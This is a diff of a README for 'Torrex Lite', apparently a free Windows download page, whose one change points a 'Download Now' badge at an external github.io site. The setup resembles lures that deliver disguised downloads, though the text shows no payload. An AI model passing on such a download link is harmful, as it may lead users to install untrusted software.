@@ -1,6 +1,6 @@
 # Torrex Lite — Download Free for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://torrex-lite-download.github.io/.github/)
 
 ---
 
